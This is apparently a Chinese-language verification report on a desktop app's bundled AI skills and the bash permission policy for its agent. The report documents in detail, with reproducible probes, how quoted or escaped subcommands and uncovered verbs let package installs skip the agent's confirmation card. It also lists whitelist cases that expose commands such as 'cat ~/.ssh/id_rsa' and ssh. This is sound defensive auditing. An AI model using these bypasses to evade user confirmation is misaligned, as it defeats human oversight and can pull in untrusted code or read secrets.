| 4 | 清单同时不含 `test/**`、`tests/**`、`scripts/**`、`*.bak` | ✓ VERIFIED | 自读 asar：`test`/`tests`/`scripts` 各 0；`*.bak` 计数 0；`main.js.bak` `false` |
| 5 | 仓库根审查结论（`.github/` 不存在、`node_modules/.cache/` 被默认排除、`dist/` 是输出目录） | ✓ VERIFIED | `.github/` 不存在；`docs/**`、`AGENTS.md`、`README.md`、`Makefile`、`vendor/`、`lib/`、`bin/`、`cli/` 保留在包内（asar 顶层 52 条目实测一致） |
| 6 | `build.files` 每一项都以 `!` 开头（不存在正向 allowlist），且有机械断言 | ✓ VERIFIED | `package.json:build.files` 实读 11 条全部 `!` 前缀；测试「每一项都以 `!` 开头」断言组通过 |
| 7 | 无任何排除项命中 `skills-builtin/**` 或 `THIRD_PARTY_NOTICES.md`（逐条路径段断言） | ✓ VERIFIED | 测试 :1661 断言 hits 为空并通过；asar 实测两者在列 |
| 8 | `make install-nightly` 不覆盖 `package.json` 的 `build.asarUnpack`（research 假设 A2） | ✓ VERIFIED | 打包产物 unpacked 面同时含 `node_modules/nodejieba/` 与 `skills-builtin/` —— 整段继承的直接证据；opt-in 断言组专用例通过 |
| 9 | Nightly 的 asar 清单与 unpacked 目录**两侧**都被确认含 `skills-builtin/**`（含 `THIRD_PARTY_NOTICES.md` 在 asar 清单） | ✓ VERIFIED | 自读 asar：`skills-builtin` 在列（下含 find-skills、skill-creator）、`THIRD_PARTY_NOTICES.md` 在列；unpacked 21 文件 |
| 10 | 运行期 userData 路径为 `~/Library/Application Support/realm-nightly/agent-workspace/managed-skills/`（**不是** realm-dev / realm） | ✓ VERIFIED | 实读该路径存在且两技能齐备；opt-in 断言含 `includes('/realm-nightly/')` 守卫 |
| 11 | `build.files` 排除项不波及 `skills-builtin/**` 与 `THIRD_PARTY_NOTICES.md` | ✓ VERIFIED | 同 #7（asar 实测 + 机械断言双证） |
| 12 | `docs/product/ai-skills.md` 新增「内置技能」「bash 包管理器安装档」两章，追加在 §七 之后、编号八与九，既有七节零改动、顺序自洽 | ✓ VERIFIED | `grep "^## "` 实读顺序：一…七（:32/:40/:55/:61/:75/:82/:93）→ 八（:101）→ 九（:141），无「六、八、九、七」错序 |
| 13 | `ai-agent-workspace.md` §四 第三档判定补「或包管理器安装表」+ 新增「两个触发源」小节；§五 复核 `brew` 例子；§七 新增第 5 条（既有 4 条一字不动） | ✓ VERIFIED | :69 表格第 ③ 档含「**危险命令表**或**包管理器安装表**」；:73-85 新增「强制确认档的两个触发源（互不包含）」小节（含 `reason` 与家族清单表）；:94 §五 白名单建议已复核（明确「`brew install` 属强制确认档」）；:105-108 既有 4 条原样，:109 为「（第 5 条）」新增项 |
| 14 | `AGENTS.md` 的「Bash 三档权限」改写为「强制确认 —— 两个互不包含的触发源」并点名家族清单；测试行计数改为实跑值、补新增测试文件 | ✓ VERIFIED | `AGENTS.md:265` 实读「…（策略引擎，**70 例**）…`node tests/test-builtin-skills-seeder.js`（播种 / 差异诊断 / 零安装语义 / 归属断言，新增）」；实跑 `# tests 70` **一致**；三档说明与家族表已改写 |
| 15 | 三份文档口径一致：沿用「三档权限」框架，不出现「四档」说法 | ✓ VERIFIED | 三份文档均以「三档」表述、`reason` 为档内细分（`ai-bash-policy.js:13-14` 亦显式声明「档位数量仍是三档」）；无「四档」命中 |
| 16 | 文档明确写出「技能不构成额外权限」与「`allowed-tools` 当前运行时不被强制、仅供参考」 | ✓ VERIFIED | `ai-agent-workspace.md:110`、`ai-skills.md:78`+`:84`、`AGENTS.md:268` 三处齐备，且都明确「SDK `Skill` 接口只有五个字段、无工具授权字段」 |
| 17 | 文档写明自愈式播种语义 / seeded 身份来源（扫随包目录名集合，非状态文件非目录位置）/ 不能删改只能禁用 / `skills/` 同名遮蔽 / 技能脚本确认成本 | ✓ VERIFIED | `ai-skills.md` §八（:101-140）含全部要点（专测 :1718 断言「自愈」等要点齐备并通过）；§九 :167 写明「每次跑技能脚本都会弹确认卡片」；`ai-agent-workspace.md:85` 与 `AGENTS.md:266/:269` 亦覆盖 |

**Score: 68/71 truths verified**（0 present-but-behavior-unverified；0 override）

---

### BLOCKER — SC3 / 阶段目标第二句未达成（CR-01，本次独立复现）

**目标保证**：包管理器安装命令**不再可能**被白名单免确认。

**实测（本次自跑 `node -e` 直调 `ai-bash-policy.js`，非采信 REVIEW/SUMMARY）**：

| 命令（shell 真实执行语义） | 白名单（文档推荐形态） | `evaluateBashCommand` 裁决 | 用户可见性 |
|---|---|---|---|
| `brew "install" wget` | `['brew']` | `{level:'allow'}` | **零卡片，直接执行** |
| `brew \install wget` | `['brew']` | `allow` | 零卡片 |
| `brew ins""tall wget` | `['brew']` | `allow` | 零卡片 |
| `npm "install" x` / `npm \i x` | `['npm']` | `allow` | 零卡片 |
| `pip "install" x` | `['pip']` | `allow` | 零卡片 |
| `cargo "install" ripgrep` | `['cargo']` | `allow` | 零卡片 |
| `bun "add" x` | `['bun']` | `allow` | 零卡片 |
| **`npm update`** / **`npm rebuild`** | `['npm']` | `allow` | 零卡片（联网取新版本 / 执行依赖生命周期脚本） |
| **`yarn workspace app add lodash`** | `['yarn']` | `allow` | 零卡片（真实常用的 monorepo 联网安装） |
| **`cargo add serde`** | `['cargo']` | `allow` | 零卡片（联网取 crates.io 依赖） |
| **`go get github.com/x/y`** | `['go']` | `allow` | 零卡片（联网取模块） |
| `brew cask install wget` | `['brew']` | `allow` | 零卡片（中间 token `cask` 击穿） |
| **对照**：`brew install wget` | `['brew']` | `confirm/install` | ✅ 弹高风险卡片 |

**取证记录（可复现）**：

```
$ node -e "const p=require('./ai-bash-policy'); console.log(JSON.stringify(p.evaluateBashCommand('npm i x', ['npm *'])))"
{"level":"confirm","reason":"install","dangerNames":[],"installNames":["npm 安装依赖"]}   # ← 目标字面形态成立

$ node -e "...evaluateBashCommand('brew \"install\" wget', ['brew'])"
{"level":"allow",...}                                                                     # ← 词法改写形态失败

$ /bin/sh -c 'set -- brew "install" wget; printf "%s " "$@"; echo'
brew install wget        # ← shell 真实 argv 与 `brew install wget` 完全相同
$ /bin/sh -c 'set -- brew \install wget; ...'   → brew install wget
$ /bin/sh -c 'set -- brew ins""tall wget; ...'  → brew install wget
```

**为什么这是目标级 gap 而非「已知启发式边界」**：

1. 文档与代码注释反复声明的兜底性质是「漏检只会降级为普通确认卡片」。`ai-bash-policy.js:233`、`docs/product/ai-skills.md:173`（「**漏检 ≠ 免确认** … 不会免确认」）、`docs/product/ai-agent-workspace.md:109` 三处同一断言。该性质的成立前提是「漏检形态也不命中白名单」，而白名单是**文本前缀**匹配 —— 任何纯词法改写都保留前缀，**前提不成立**，实测一律 `allow`。
2. `docs/product/ai-agent-workspace.md:94` 是本阶段自己给出的推荐配置（「只加构建类可信命令（`npm run`、`git status`、`brew` 等）」），同一行还断言裸条目 `brew` 下「`brew install` … **加入白名单也无效**」。因此触发前提是**推荐配置下的默认状态**，非用户乱配。
3. 本阶段已识别该类问题的一半并处理（`stripLeadingQuotes`（:289-291）正是为 `'npm' i x` 加的），对称的另一半（子命令侧引号 / 反斜杠 / 引号拼接）未处理 —— 属**遗漏而非设计选择**；第二家族（中间 token）更无需任何引号，成本为一次字符插入。
4. `ai-manager.js:5658` 的卡片文案「该命令不会因为加入白名单而免确认」在漏检形态下根本不会显示（走不到 confirm 分支）—— 该承诺本身为假。

**为何 `npm update` / `cargo add` / `go get` 家族尤其严重**：它们是模型自然会产出的**真实安装命令**（不是为绕过而构造的怪写法），且不依赖任何引号技巧。`npm update` 会拉取新版本并执行依赖的 `postinstall` 脚本 —— 与 D-14 认定 `npm ci` 应计入安装档的理由（「不取新代码 ≠ 不执行任意代码」）完全同源，却因「安装档是子命令黑名单」而漏网。

**修复方向（REVIEW CR-01 的修法，本次核验其在既有测试护栏下可行）**：把安装档从「子命令黑名单」改为「**首 token 是包管理器 → 默认强制确认；只有显式只读子命令白名单才降级**」（默认拒绝而非默认放行），并在匹配前做一次与白名单共用的规范化（去引号 + 去反斜杠转义）。既有 34 条只读反例断言（`npm run dev` / `brew info` / `pip list` / `uv --version` 等）正是这套「默认拒绝」规则的现成护栏，改造后应全绿；本修法**不需要**改 `matchesWhitelist`（不动 47-02 锁定的四函数不变式）。

**若判定本阶段不改**：至少必须把 `ai-bash-policy.js:223-239` 的 ⑦-b 段与三份文档的「漏检 ≠ 免确认 / 白名单不可越过」改成**有前提**的表述（显式区分「未命中白名单的漏检」与「命中白名单前缀的漏检」），并新增一条钉住实际行为的断言 —— 否则文档在给用户虚假的安全保证。

**This gap looks intentional in its current shape**（install 短路位置正确、只差匹配口径与词表覆盖）。若团队决定接受为已知边界而非本阶段修复，可在 `47-VERIFICATION.md` frontmatter 加 override 收敛，但**必须**同步改写三份文档的绝对化承诺：

```yaml
overrides:
  - must_have: "包管理器安装命令不再可能被白名单免确认（SC3）"
    reason: "{接受词法改写边界；三份文档已改为有前提表述并补钉行为断言}"
    accepted_by: "{name}"
    accepted_at: "{ISO timestamp}"
```

---

### Deferred Items

Items not yet met but explicitly addressed in later milestone phases.

| # | Item | Addressed In | Evidence |
|---|------|-------------|----------|
| 1 | 播种诊断对用户可见（`getSeedDiagnostics()` 的消费面） | Phase 50 | Phase 50 Goal：「用户可在设置页看到全部技能的名称 / 描述 / 来源 / 体积 / 文件数 / **诊断**」；47-CONTEXT「不在本阶段：设置页技能管理区与 `/api/skills/*`（50）」。**注**：仅「消费者」这一半被 defer；gap #4 的 `console.error` 缺失不受 Phase 50 覆盖 |
| 2 | `allowed-tools` 的解析与展示 | Phase 51 | 47-CONTEXT §Deferred：「本阶段只做文档声明（D-18）… O5 显式解析 frontmatter 归 Phase 51」 |
| 3 | find-skills 指路的「设置 → AI → 技能管理 → 导入」入口实现 | Phase 51 | Phase 51 Goal：「用户可从本地 zip 包或网络地址安全导入技能」；D-03 已显式接受 Phase 47~50 期间该入口尚未实现 |
| 4 | find-skills 恢复 CLI 路线（工作区内安装 skills CLI 做只读检索） | 里程碑后续改版 | D-01 Reversibility 记录：用户 2026-09-11 明确要求记入里程碑；前置条件是先引入 OS 级隔离 |

---

### Required Artifacts

| Artifact | Expected | Status | Details |
| --- | --- | --- | --- |
| `skills-builtin/find-skills/SKILL.md` | Realm 化改写版，中文正文，frontmatter 含 name/中文 description/`disable-model-invocation` | ✓ VERIFIED | 6,933 B；正文 CJK 1,510；零安装语义扫描零命中 |
| `skills-builtin/find-skills/LICENSE.txt` | MIT 全文 | ✓ VERIFIED | 1,063 B；`Copyright (c) vercel-labs`（归属行口径见 WR-07） |
| `skills-builtin/skill-creator/**` | 上游 18 文件逐字快照 + 自研 `check_env.mjs` | ✓ VERIFIED | 19 文件；表内 17 文件 17/17 sha256 与上游相同；`SKILL.md` 32,672 B（diff 已核对）；LICENSE 11,357 B 逐字 |
| `builtin-skills-seeder.js` | 导出 6 个公开成员 + 2 个测试成员 | ✓ VERIFIED | `module.exports` 实读含 `seedBuiltinSkills`/`resolveBuiltinSkillsSrc`/`getSeededSkillNames`/`getSeedDiagnostics`/`setBuiltinDepsForTest`/`_resetForTest` + `detectDiff`/`safeCopyDir` |
| `main.js` | 播种调用位于 `migrateAiMemory()` 之后、`new AIManager()` 之前 | ✓ VERIFIED | `:4043` migrate → `:4048` seed → `:4051` new AIManager，行序正确 |
| `package.json` | `asarUnpack` 追加 `skills-builtin/**`；`build.files` 11 条 `!` 排除 | ✓ VERIFIED | 实读：`asarUnpack: ["node_modules/nodejieba/**","skills-builtin/**"]`；`files` 11 条全 `!` 前缀 |
| `THIRD_PARTY_NOTICES.md` | repo 根；两技能各五要素 | ✓ VERIFIED | 8,967 B；§1/§2 五要素齐备，均标 `modified` |
| `ai-bash-policy.js` | 新增 `PACKAGE_MANAGER_INSTALL_PATTERNS` + `stripLeadingQuotes` + `matchInstall` + `installNames` 收集与 install 短路 | ✓ VERIFIED | 13 条表（:241-255）、辅助函数（:289-305）、`installNames` 全分支返回（:330/:341/:344/:348/:350） |
| `ai-manager.js` | install 分支 high + 专属文案/标题 | ✓ VERIFIED | `:5652-5669` 三分支 |
| `tests/test-ai-bash-policy.js` | 新增两 describe + 同步 2 条 deepStrictEqual | ✓ VERIFIED | 70 tests / 0 fail |
| `tests/test-builtin-skills-seeder.js` | 端到端 + 差异诊断/自愈/原子性 + 深度扫描器 + P10 组 + 打包护栏 | ✓ VERIFIED | 88 tests（含 opt-in 4 例 → 92）/ 0 fail |
| `docs/product/ai-skills.md` | 新增 §八 §九 | ✓ VERIFIED | :101 / :141，顺序自洽 |
| `docs/product/ai-agent-workspace.md` | §四 三档句 + 两触发源小节；§五 复核；§七 新增第 5 条 | ✓ VERIFIED | 见 47-04 #13 |
| `AGENTS.md` | 三档说明改写 + 测试行计数 + 3 条维护约定 | ✓ VERIFIED | :265（70 例，与实跑一致）、:266、:268、:269 |

### Key Link Verification

| From | To | Via | Status | Details |
| --- | --- | --- | --- | --- |
| `main.js` 启动链路 | `builtin-skills-seeder` | `ensureWorkspaceDir()` → `migrateAiMemory()` → **`seedBuiltinSkills()`** → `new AIManager()` → `init()` → `refreshSkills()` | ✓ WIRED | :4042-4051 行序正确；播种早于 `init()` |
| `resolveBuiltinSkillsSrc()` | `getManagedSkillsDir()` | 随包源（`app.isPackaged` 分支）→ 沙箱内 managed 目标 | ✓ WIRED | :55-62 / :72-75；打包态实跑落在 `realm-nightly/.../managed-skills/` |
| `package.json:build.asarUnpack` | `process.resourcesPath/app.asar.unpacked/skills-builtin` | 成对不变式 | ✓ WIRED | 打包产物 unpacked 面 21 文件实证；`nodejieba` 同时在列证明整段继承 |
| `evaluateBashCommand` 流水线 | `ai-manager.js` 确认卡片 | `splitCommandPipeline` → `matchDangerous`+`matchInstall` 收集 → danger 先返回 → **install 短路（先于白名单）** → `matchesWhitelist` → 默认 confirm | ⚠️ PARTIAL | 结构正确，但 install 短路**未能覆盖** shell 等价的词法改写形态（BLOCKER）；因此「白名单不可越过」这条不变式只在字面形态下成立 |
| `verdict.reason === 'install'` | `requestActionConfirmation({riskLevel:'high'})` | `:5652` → `:5660-5670` | ✓ WIRED | title/文案/high 三处齐备；未确认返回 `cancelled` 正常结果不 throw（:5672-5680） |
| `THIRD_PARTY_NOTICES.md` 固定 SHA | 实际下载源 `raw.githubusercontent.com/<repo>/<sha>/…` | 声明值 ↔ 分发物一致 | ✓ WIRED | 用声明的 SHA 实际下载 17 文件全部成功且 sha256 与本地相同；find-skills SHA 经 API 复核日期一致 |
| `skills-builtin/skill-creator/SKILL.md` `## Reference files` | 实际随包文件集 | 清单 ↔ 磁盘逐项 | ✓ WIRED | diff 显示清单已含 `check_env.mjs`、删三章引用；专测逐项核对通过 |
| `check_env.mjs` | Python 探测 + 包检查 | `spawnSync` → `importlib.util.find_spec` → JSON + `ok` 决定退出码 | ✓ WIRED | 实跑：`python3.12.12` 探测成功、`capabilities.catalog` 4 组输出、exit 0；未知 capability → `unknown_requirement` |
| `DANGEROUS_INTERPRETERS`（含 `node`/`python3`） | 技能脚本执行路径 | `node scripts/check_env.mjs` → `reason:'danger'` 强制确认 | ✓ WIRED | 集合实读未放宽；SKILL-09 的「零新增权限机制」成立 |
| `build.files` 排除项 | `THIRD_PARTY_NOTICES.md` / `skills-builtin/**` 是否在包内 | 排除项不得命中自家交付物 | ✓ WIRED | asar 实测两者在列 + 机械断言通过 |

### Data-Flow Trace (Level 4)

| Artifact | Data Variable | Source | Produces Real Data | Status |
| --- | --- | --- | --- | --- |
| `builtin-skills-seeder.js` | `names`（播种清单） | `getSeededSkillNames()` → `readdirSync(skills-builtin)` 运行时扫描（零状态文件） | 是 —— 21 文件实际落盘至 `realm-nightly/.../managed-skills/` | ✓ FLOWING |
| `builtin-skills-seeder.js` | `_diagnostics` | 运行时失败/差异累积 | 是（数据真实），但**无消费方**（生产 grep 零命中）→ 见 gap #4 | ⚠️ STATIC（无出口） |
| `ai-bash-policy.js` | `verdict` | 纯函数裁决（`params.command` + `configStore.get('settings.aiBashWhitelist')` 实时读取，无缓存） | 是 —— `ai-manager.js:5647` 真实消费 `level`/`reason`/`dangerNames`/`installNames` | ✓ FLOWING |
| `ai-manager.js` | `dangerHint` / `title` / `riskLevel` | `verdict.reason` 三分支 | 是 —— 传入 `requestActionConfirmation` → 渲染端卡片 | ✓ FLOWING |
| `THIRD_PARTY_NOTICES.md` | 固定 SHA | 人工记录（非运行时），由测试逐字断言 | 是 —— 与上游实际 commit 一致 | ✓ FLOWING（静态契约） |

### Behavioral Spot-Checks

| Behavior | Command | Result | Status |
| --- | --- | --- | --- |
| **SC3 靶心（字面）**：白名单不可越过安装档 | `node -e "…evaluateBashCommand('npm i x', ['npm *'])"` | `{level:'confirm', reason:'install'}` | ✓ PASS |
| **SC3 靶心（shell 等价）**：词法改写形态 | `node -e "…evaluateBashCommand('brew \"install\" wget', ['brew'])"` | `{level:'allow'}` —— **零卡片** | ✗ **FAIL（BLOCKER）** |
| **SC3 家族漏检**：`npm update` / `cargo add` / `go get` / `yarn workspace app add` | 同上，白名单取文档推荐形态 | 全部 `allow`，无卡片 | ✗ **FAIL（BLOCKER）** |
| shell 语义确认（不是「怪命令」） | `/bin/sh -c 'set -- brew "install" wget; printf "%s " "$@"'` | `brew install wget`（与未加引号形态 argv 完全相同） | ✗ （证实 gap 真实） |
| 13 家族 / 只读反例 / 优先序 / 复合收集 | `node -e` 自跑 60+ 条断言式探测 | 全部符合 must_haves 声明 | ✓ PASS |
| 策略引擎测试套件 | `node --test tests/test-ai-bash-policy.js` | `# tests 70 / pass 70 / fail 0` | ✓ PASS |
| 播种测试套件（hermetic） | `node tests/test-builtin-skills-seeder.js` | `# tests 88 / pass 88 / fail 0` | ✓ PASS |
| 打包面断言组（opt-in） | `REALM_PACKAGED_VERIFY=1 … node tests/test-builtin-skills-seeder.js` | `# tests 92 / pass 92 / fail 0`（4 例打包面全过） | ✓ PASS |
| 幂等（诊断面） | 连续两次 `seedBuiltinSkills()` | 第二次诊断 `[]`（无 overwritten 误报） | ✓ PASS |
| **幂等（写入面）** | 连续两次播种比对 inode/mtime | SKILL.md inode `171120956→171120958`、目录 inode `171120955→171120957` —— **被重建** | ✗ **FAIL（gap #2）** |
| **残留清收 → 幽灵技能** | 预置 `.bak_<ts>`/`.tmp_<ts>` → 播种 → `refreshSkills()` | 残留留存；技能集多出 2 个幽灵条目；diagnostics 4（`invalid_metadata`×2 / `realm_name_rewritten`×2） | ✗ **FAIL（gap #3）** |
| 上游快照逐字性 | 从固定 SHA 下载 17 文件后逐文件 sha256 比对 | **17/17 SAME** | ✓ PASS |
| `skill-creator/SKILL.md` 受控改动范围 | 与上游 diff 全文比对 | diff 恰为声明的那组改动，无额外偏离 | ✓ PASS |
| 正文语言 | 统计 frontmatter 之后 CJK | skill-creator 0 / find-skills 1510 | ✓ PASS |
| 零安装语义（宽口径） | `grep -rn -E "…" skills-builtin/` | 零命中 | ✓ PASS |
| `check_env.mjs` | `node --check` + 无参运行 + `--capability nonexistent` + `REALM_SKILL_CREATOR_PYTHON=/nonexistent/python` | 语法 OK / exit 0 + JSON / `unknown_requirement` / `python_not_found` | ✓ PASS |
| 打包 asar 清单 | 自读 asar 头部目录 JSON | 8 类开发目录全 0、`*.bak` 0、`skills-builtin`+`THIRD_PARTY_NOTICES.md` 在列、`PITFALLS.md` 不在列 | ✓ PASS |
| 相邻套件回归 | `node tests/test-ai-skills.js` / `node tests/test-agent-workspace.js` | 64/64、21/21 全过 | ✓ PASS |
| 四函数零改动 | 与 `edbeff5d…^` 按函数体逐字比对 | `normalizeSegment`/`splitCommandPipeline`/`extractCommandName`/`matchesWhitelist` 全零改动 | ✓ PASS |
| 沙箱零改动 | `git log -- agent-workspace.js` | 最后改动为 Phase 46 的 `b12b57d`，本阶段未动 | ✓ PASS |

### Probe Execution

| Probe | Command | Result | Status |
| ----- | ------- | ------ | ------ |
| — | `find scripts -path '*/tests/probe-*.sh'` / grep PLAN+SUMMARY for `probe-` | 无探针脚本，本阶段未声明 probe | ℹ️ SKIPPED（非 migration/tooling 阶段，无 probe 契约） |

### Requirements Coverage

| Requirement | Source Plan | Description | Status | Evidence |
| --- | --- | --- | --- | --- |
| **SKILL-09** | 47-03 | 技能自带 `scripts/` 可经既有 bash 工具在沙箱内执行，复用既有白名单 + 确认卡片，零新增权限机制 | ✓ SATISFIED | `DANGEROUS_INTERPRETERS` 含 `node`/`python3` 未放宽；`check_env.mjs` 实跑通过；`agent-workspace.js` 本阶段零改动 |
| **SEED-01** | 47-01, 47-03 | 随包内置 find-skills（Realm 化改写版）与 skill-creator 两个技能 | ✓ SATISFIED | `skills-builtin/` 21 文件；find-skills 中文改写版；skill-creator 上游 18 文件逐字快照 + 自研探针 |
| **SEED-02** | 47-01 | 首次启动幂等播种到 `managed-skills/` | ✓ SATISFIED（含 2 条子项 FAILED） | 行为成立且实跑落盘；**「幂等」的写入面不成立**（gap #2：`same` 仍重建）—— `managed-skills/` 已改名为 app-owned 无条件覆盖语义且 ROADMAP 判据 1 已同步改写；D-08/D-09 字面达成 |
| **SEED-03** | 47-01, 47-03 | 内置技能文本不含任何「执行外部安装」语义；find-skills 输出候选清单 + 引导设置页导入 | ✓ SATISFIED | 宽口径扫描零命中；find-skills 显式禁令段 + 设置页指路；skill-creator 仅一条**禁止**安装声明（已行级豁免登记） |
| **SEED-04** | 47-01, 47-03 | 内置技能默认 `disable-model-invocation: true` | ✓ SATISFIED | 两技能 frontmatter 均含该字段；纵切测试断言 `buildSkillsPrompt() === ''` |
| **SEED-05** | 47-03, 47-04 | 随包分发正确（`asarUnpack` + `app.isPackaged` 路径分支）+ 各自 LICENSE + `THIRD_PARTY_NOTICES` 五要素 | ✓ SATISFIED | 打包两面实证 + 运行期播种实证 + 归属五要素齐备、SHA 复核一致 |
| **SEC-01** | 47-02 | `ai-bash-policy` 新增「包管理器安装」档：`npx`/`npm i`/`pnpm add`/`pip install`/`brew install` 强制确认，**白名单不可越过** | ✗ **BLOCKED** | 档位本身已交付且 13 家族覆盖、字面白名单不可越过、70 例全绿；但「**白名单不可越过**」作为保证被词法改写绕过证伪（BLOCKER）—— shell 实际执行的安装命令可获 `allow` 零卡片。**需求不得标 Complete 直到该 gap 关闭或三份文档承诺改写 + override 归档** |
| **DOC-02** | 47-04 | 同步 `docs/product/ai-agent-workspace.md`（技能不构成额外权限、`allowed-tools` 不被强制）与 `AGENTS.md` | ✓ SATISFIED（含 1 条准确性 Warning） | 两条声明在三份文档齐备；**但三份文档中「白名单不可越过 / 漏检 ≠ 免确认」的绝对化表述在漏检形态下为假**（见 BLOCKER 的 fix 第 4 项 / WR-01 旁证）；另 `ai-skills.md:163` 交叉引用「第七节第 5 条」应为第 6 条（IN-04） |

**Orphaned requirements:** 无。`REQUIREMENTS.md` 映射到 Phase 47 的 8 个 ID（SKILL-09, SEED-01..05, SEC-01, DOC-02）与 4 份 PLAN 的 `requirements` 字段并集完全一致，无遗漏、无多余。

### Anti-Patterns Found

债务标记门禁：**PASS** —— 本阶段改动文件内无未引用 `TBD` / `FIXME` / `XXX`（`ai-manager.js:487/:524` 的 `XXX` 是既有工具描述里的中文占位符，非本阶段改动行）。

| File | Line | Pattern | Severity | Impact |
| --- | --- | --- | --- | --- |
| `ai-bash-policy.js` | 133-155（`matchesWhitelist`）、241-255、289-305 | 白名单（原文前缀匹配）与安装档（子命令正则）口径不一致 → 纯词法改写绕过，`level:'allow'` 零卡片 | 🛑 **Blocker** | 见 BLOCKER 节（已计入 gaps #1） |
| `builtin-skills-seeder.js` | 364-376 | `safeCopyDir` 在 `diff === 'same'` 分支同样执行 → 每次启动整目录重建 | ⚠️ Warning | 见 gaps #2（已计入） |
| `builtin-skills-seeder.js` | 254-285、360-386 | tmp/bak 落在技能扫描根内且无启动清扫 → 残留被加载成幽灵技能 + 4 条诊断 | ⚠️ Warning | 见 gaps #3（已计入） |
| `builtin-skills-seeder.js` | 336-355、377-385、397-399 | 三条内层失败路径只 push 诊断、无 `console.error`；`getSeedDiagnostics()` 无生产消费方 → 正式版播种全失败与全成功不可区分 | ⚠️ Warning | 见 gaps #4（已计入）；与 nodejieba 事故 9a1ae11 同型 |
| `ai-bash-policy.js` | 143-150、358-374 | 白名单条目 `'*'` 通过 `validateWhitelistList`（返回 `{valid:true}`），`e.slice(0,-1)===''` 使 `startsWith('')` 恒真 → 全部非危险/非安装命令（含任意文件读取、下载落盘、`ssh`）免确认 | ⚠️ Warning | 独立复现：`['*']` 下 `cat ~/.ssh/id_rsa` / `curl -o /tmp/x http://…` / `less /etc/passwd` / `ssh user@host` 全部 `allow`。不突破阶段目标（install/danger 仍先拦截），但使文档 §五「不要加 `cat`/`less` 这类通用命令」的警告被一个字符作废，且 UI 无任何提示 |
| `ai-bash-policy.js` | 165-177、241-255、262-273 | 模式表对规范化原文做大小写敏感匹配，而 macOS 文件系统默认不区分且 shell 能解析大写命令名 | ⚠️ Warning | 独立复现：`RM -rf /tmp/x` / `SUDO ls` → `confirm/default`（`dangerNames:[]`）→ 卡片为**中风险**「该命令未命中白名单」，与 `rm -rf` 的高风险提示形成误导性差异；`brew INSTALL wget` / `NPM i x` 同理不判 install（非免确认，故非 Blocker） |
| `skills-builtin/skill-creator/scripts/check_env.mjs` | 35-46、54-59、68 | capability→依赖映射错误：`description-optimize` 声明需要 `anthropic`，但**全目录零 `import anthropic`**；它实际调用的 `run_loop.py` → `improve_description.py:26` 硬依赖外部 `claude` CLI（`cmd = ["claude","-p",…]`），而 `KNOWN_COMMANDS = ['node','python3']` 把 `claude` 排除 | ⚠️ Warning | 探针给出**假阳性**：装了 `anthropic`、没装 `claude` 的机器上 `--capability description-optimize` 返回 `ok:true`，而 SKILL.md 第 3 步随即指导运行 `run_loop`，必在 `_call_claude` 崩掉。与探针自称「缺口不会静默」及 `THIRD_PARTY_NOTICES.md §4`「capability 面已收缩为 4 组…依赖 `claude` CLI 的 run-eval / run-loop 两组已去掉」的口径冲突（`description-optimize` 本身即 run_loop 路径） |
| `skills-builtin/find-skills/LICENSE.txt` | 3 | 版权行 `Copyright (c) vercel-labs` 与上游**现在**公布的 LICENSE 不一致 | ⚠️ Warning | 本次独立取证：`https://raw.githubusercontent.com/vercel-labs/skills/main/LICENSE` → HTTP 200，正文为 `Copyright (c) 2026 Vercel, Inc.`（上游 2026-07-22 提交 `e173b8c88f25` "Add MIT license"，比本阶段固定 SHA 2026-07-10 晚 12 天）。MIT 要求保留版权声明，随包副本应使用上游声明的权利人 |
| `THIRD_PARTY_NOTICES.md` | 93-100、117-130 | §3.1 断言「find-skills 的上游仓库根没有独立 LICENSE 文件」用无时点限定的现在时（在固定 SHA 时点为真，今天已为假）；§5 升级清单四步无「上游补录许可证文本后同步随包副本」 | ⚠️ Warning | P10 断言只检查关键词与 SHA 字面量，检不出这种过期；「换 SHA 时把版权行对齐上游」不会被任何流程触发 |
| `skills-builtin/skill-creator/eval-viewer/generate_review.py` | 288-306（调用 :438-447） | `_kill_port()` 无条件 `lsof -ti :3117` 并对返回的**每个** PID 发 `SIGTERM`，无归属校验 | ⚠️ Warning | 该文件是**上游逐字副本**（sha256 已比对 SAME），但 Realm 选择随包并把它接进自动化链路即承担其行为；SKILL.md 评测章会引导模型跑该链路，而确认卡片只显示 `python3 …/generate_review.py …` 一行 ——「会先杀掉占用 3117 端口的进程」不在卡片所见范围，与 `ai-agent-workspace.md §七`「卡片所见即所确认」的安全模型冲突 |
| `ai-bash-policy.js` | 241-255；`docs/product/ai-skills.md` | 家族表未覆盖 `bunx`（`bun x` 的独立入口）与 `pipx` | ℹ️ Info | 独立复现：`bunx cowsay hi` / `pipx install black` → `matchInstall null`、`confirm/default`。**不构成绕过**（仍弹普通卡片，且白名单前缀匹配不上），但属可直接补的漏检 |
| `ai-bash-policy.js` | 262-273 | `matchDangerous` 未复用 `stripLeadingQuotes` —— 引号包裹的解释器名不判危险 | ℹ️ Info | 实测 `'sh' -c 'x'` / `"python3" -c x` → `danger:null`（落到 `confirm/default`，非免确认）；两侧口径不对称是维护隐患 |
| `skills-builtin/skill-creator/scripts/check_env.mjs` | 394-409、516-534、373-385 | 各分支返回形状不一致（`missing_command` 分支缺 `attempted`；`unknownRequirementResult` 不复用 `buildResult`） | ℹ️ Info | `buildResult` 注释宣称「顶层字段固定 … 调用方不必做存在性分支」，调用方按注释读 `result.attempted.length` 会在这两条分支拿到 `undefined` |
| `docs/product/ai-skills.md` | 163 | 交叉引用「[ai-agent-workspace.md](ai-agent-workspace.md) 第七节第 5 条」，而 `allowed-tools` 声明实际落在第 **6** 条（:110）；`AGENTS.md:268` 同样引「第七节第 5 条」 | ℹ️ Info | 章节内序号为 1..6（第 5 条是「安装档只审一级 bash 命令」、第 6 条是「技能不构成额外权限 / allowed-tools」）—— 两处引用均指向错误条目 |

### Human Verification Required

**状态为 `gaps_found`（规则 1 优先），以下两项不改变裁决，仅记录为待人工确认的残余面。**

#### 1. 打包 .app 进程内「零诊断 + 不进 prompt」

**Test:** 启动 `/Applications/Realm Nightly.app`（**先 `pgrep -fl Realm` 确认无冲突实例** —— 用户当前有 `/Applications/Realm.app` 生产实例在跑；**不得**用路径模式 `pkill` / `pkill -f Realm` 清理），以 Node inspector 直连主进程读取 `ai-skills-manager._cache.diagnostics` / `_cache.errors` 与 `buildSkillsPrompt()`。
**Expected:** 两数组均为 `[]`；`buildSkillsPrompt() === ''`。
